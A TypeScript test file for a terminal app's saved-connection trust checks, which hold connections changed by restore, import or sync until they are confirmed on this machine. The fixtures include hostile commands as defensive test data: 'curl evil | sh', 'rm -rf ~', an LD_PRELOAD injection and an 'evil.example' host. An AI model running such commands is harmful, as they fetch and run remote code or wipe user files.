/**
 * A saved connection that changed elsewhere (a restore, an import, a synced file)
 * runs nothing by itself until it is confirmed on this machine (#6065).
 */
import { beforeEach, describe, expect, it, vi } from "vitest";
import { invoke } from "@tauri-apps/api/core";
import { setupSettingsRegion, seedSettings } from "@/test/settingsRegionTestHarness";
import { setupConnectionsRegion, seedConnectionsRegion } from "@/test/connectionsHarness";
import { currentSettingsView } from "@/store/settingsBridge";
import type { SavedConnection } from "@/types/connection";
import type { WorkspaceTabGroupDef } from "@/types/workspace";
import { resolveImportTrust, type TrustedTabDef } from "./workspaceImportTrust";
import {
  confirmOnceSaved,
  confirmSavedConnection,
  confirmedWithoutWaiting,
  resetSavedConnectionTrustForTest,
  ensureSavedConnectionBaseline,
  isSavedConnectionConfirmed,
  savedConnectionKey,
  unconfirmedConnectionCheck,
  whatRunsByItself,
} from "./savedConnectionTrust";

setupSettingsRegion();
setupConnectionsRegion();

const shell = (over: Record<string, unknown> = {}): SavedConnection => ({
  id: "Build shell",
  name: "Build shell",
  folderId: null,
  config: { type: "local", config: { shell: "bash", ...over } },
});
const ssh = (over: Record<string, unknown> = {}): SavedConnection => ({
  id: "Prod",
  name: "Prod",
  folderId: null,
  config: { type: "ssh", config: { host: "prod.example", port: 22, username: "ana", ...over } },
});

beforeEach(() => {
  resetSavedConnectionTrustForTest();
  vi.mocked(invoke).mockImplementation(() => Promise.resolve(null));
  seedSettings({ workspaceImportAllowlist: [] });
});

describe("what a saved connection runs by itself (#6065)", () => {
  it("keys on what runs and where, not on the rest", async () => {
    const key = await savedConnectionKey(ssh().config);
    expect(key).toMatch(/^saved:[0-9a-f]{64}$/);
    expect(await savedConnectionKey(ssh({ keepaliveIntervalSecs: 30 }).config)).toBe(key);
    for (const changed of [
      { host: "other.example" },
      { username: "root" },
      { port: 2222 },
      { initialCommand: "rm -rf ~" },
      { onReconnectCommand: "curl evil | sh" },
      { forwardAgent: true },
      { enableX11Forwarding: true },
      { env: { LD_PRELOAD: "/tmp/x.so" } },
      { proxyJump: [{ host: "jump.example" }] },
    ]) {
      expect(await savedConnectionKey(ssh(changed).config), JSON.stringify(changed)).not.toBe(key);
    }
  });

  it("counts an empty or switched-off setting as none, and the type as what runs", async () => {
    const key = await savedConnectionKey(ssh().config);
    expect(
      await savedConnectionKey(ssh({ forwardAgent: false, initialCommand: "", env: null }).config)
    ).toBe(key);
    expect(
      await savedConnectionKey({ type: "telnet", config: { ...ssh().config.config } })
    ).not.toBe(key);
  });

  it("says what would run", () => {
    expect(
      whatRunsByItself(
        ssh({ initialCommand: "make", onReconnectCommand: "tail -f log", forwardAgent: true })
          .config
      )
    ).toEqual([
      "Runs “make” once connected",
      "Runs “tail -f log” after each reconnect",
      "Forwards your SSH agent to the host",
    ]);
    expect(whatRunsByItself(shell().config)).toEqual(["Starts bash on this computer"]);
    expect(whatRunsByItself(ssh().config)).toEqual([]);
  });
});

describe("confirmed on this machine (#6065)", () => {
  it("are the connections it had when this started, once", async () => {
    seedConnectionsRegion({ connections: [shell({ initialCommand: "make" }), ssh()] });
    await ensureSavedConnectionBaseline();
    expect(await isSavedConnectionConfirmed(shell({ initialCommand: "make" }))).toBe(true);
    expect(await isSavedConnectionConfirmed(ssh())).toBe(true);
    // A later change, by a restore or a synced file, is not.
    expect(await isSavedConnectionConfirmed(shell({ initialCommand: "curl evil | sh" }))).toBe(
      false
    );
    seedConnectionsRegion({ connections: [ssh({ host: "evil.example" })] });
    await ensureSavedConnectionBaseline();
    expect(await isSavedConnectionConfirmed(ssh({ host: "evil.example" }))).toBe(false);
  });

  it("writes the settings only for something new, and knows it at once afterwards", async () => {
    await confirmSavedConnection(ssh({ host: "a.example" }).config);
    const writes = () => vi.mocked(invoke).mock.calls.filter(([cmd]) => cmd === "save_settings");
    const before = writes().length;
    await confirmSavedConnection(ssh({ host: "a.example" }).config);
    expect(writes().length).toBe(before);
    resetSavedConnectionTrustForTest();
    expect(confirmedWithoutWaiting(ssh({ host: "a.example" }))).toBe(false);
    expect(await isSavedConnectionConfirmed(ssh({ host: "a.example" }))).toBe(true);
    expect(confirmedWithoutWaiting(ssh({ host: "a.example" }))).toBe(true);
  });

  it("confirms a connection saved in the editor as the backend keeps it", async () => {
    const stored = ssh({ host: "kept.example", port: 22 });
    seedConnectionsRegion({ connections: [] });
    await ensureSavedConnectionBaseline();
    seedConnectionsRegion({ connections: [stored] });
    await confirmOnceSaved(
      Promise.resolve("Prod"),
      ssh({ host: "kept.example", port: 2200 }).config
    );
    expect(await isSavedConnectionConfirmed(stored)).toBe(true);
  });

  it("is what the user confirmed, kept where no file can write it", async () => {
    await confirmSavedConnection(ssh({ host: "new.example" }).config);
    expect(await isSavedConnectionConfirmed(ssh({ host: "new.example" }))).toBe(true);
    expect(currentSettingsView().workspaceImportAllowlist).toContain(
      await savedConnectionKey(ssh({ host: "new.example" }).config)
    );
  });
});

describe("a workspace or the last session that opens a saved connection (#6065)", () => {
  const groups = (): WorkspaceTabGroupDef[] => [
    { name: "Main", layout: { type: "leaf", tabs: [{ connectionRef: "Build shell" }] } },
  ];
  const held = (g: WorkspaceTabGroupDef[]) =>
    g[0].layout.type === "leaf"
      ? (g[0].layout.tabs[0] as TrustedTabDef).savedConnectionUnconfirmed === true
      : null;

  it("holds a tab whose connection changed here since it was confirmed", async () => {
    seedConnectionsRegion({ connections: [shell({ initialCommand: "make" })] });
    await ensureSavedConnectionBaseline();
    const changed = [shell({ initialCommand: "curl evil | sh" })];
    const resolved = await resolveImportTrust(
      groups(),
      currentSettingsView().workspaceImportAllowlist,
      unconfirmedConnectionCheck(changed)
    );
    expect(held(resolved)).toBe(true);
  });

  it("opens an unchanged one as before", async () => {
    seedConnectionsRegion({ connections: [shell({ initialCommand: "make" })] });
    await ensureSavedConnectionBaseline();
    const resolved = await resolveImportTrust(
      groups(),
      currentSettingsView().workspaceImportAllowlist,
      unconfirmedConnectionCheck([shell({ initialCommand: "make" })])
    );
    expect(held(resolved)).toBe(false);
  });
});
